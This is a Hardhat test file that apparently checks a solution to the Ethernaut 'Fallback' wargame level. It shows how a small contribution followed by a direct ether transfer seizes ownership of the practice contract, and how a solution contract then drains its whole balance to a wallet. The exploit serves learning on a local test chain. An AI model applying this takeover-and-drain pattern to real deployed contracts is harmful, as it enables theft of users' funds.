import { expect } from "chai";
import { ethers } from "hardhat";
import { Fallback, TestEvent, Level1Solution } from "../typechain";

describe("Fallback", function () {
  it("work", async function () {
    const Contract = await ethers.getContractFactory("Fallback");
    const contract = await Contract.deploy();
    await contract.deployed();

    const [owner, me] = await ethers.getSigners();

    expect(await contract.owner()).to.equal(owner.address);

    await contract
      .connect(me)
      .contribute({ value: ethers.utils.parseEther("0.0001") });

    await me.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseEther("0.0001"),
    });

    expect(await contract.owner()).to.equal(me.address);
  });

  it("contract", async () => {
    const Contract = await ethers.getContractFactory("Fallback");
    const contract = await Contract.deploy();
    await contract.deployed();

    const [owner] = await ethers.getSigners();
    expect(await contract.owner()).to.equal(owner.address);

    // deploy solution contract with enough ether to complete the task
    const Solution = await ethers.getContractFactory("Level1Solution");
    const solution = await Solution.deploy(contract.address, {
      value: ethers.utils.parseEther("0.001"),
    });
    await solution.deployed();

    // test that the constructor made the correct contribution to the Fallback contract
    expect(
      (await ethers.provider.getBalance(solution.address)).toNumber()
    ).to.be.equal(
      ethers.utils.parseEther("0.001").toNumber() -
        ethers.utils.parseUnits("500", "wei").toNumber()
    );
    expect(await contract.connect(solution.address).getContribution()).to.equal(
      ethers.utils.parseUnits("500", "wei").toNumber()
    );

    // take control of the contract and withdraw the funds, (original contribution)
    await solution.gainControlAndWithdraw();

    // check for correct new ownership
    expect(await contract.owner()).to.equal(solution.address);

    // check that the Fallback contract has ZERO funds left!
    expect(
      await (await ethers.provider.getBalance(contract.address)).toNumber()
    ).to.be.equal(0);

    // check that the Solution contract has all the funds 💰
    expect(
      (await ethers.provider.getBalance(solution.address)).toNumber()
    ).to.be.equal(ethers.utils.parseUnits("0.001", "ether"));

    // withdraw the ether from the Solution contract to personal wallet
    const tx = await solution.connect(owner).withdraw();
    const rc = await tx.wait();
    const event = rc?.events?.find((e) => e?.event === "Withdraw");
    const amount = event?.args?.[0]?.toNumber();

    console.log("Withdrawing: ", `${ethers.utils.formatEther(amount)} ether`);

    // check Solution contract has nothing left.
    expect(
      await (await ethers.provider.getBalance(solution.address)).toNumber()
    ).to.be.equal(0);
  });
});
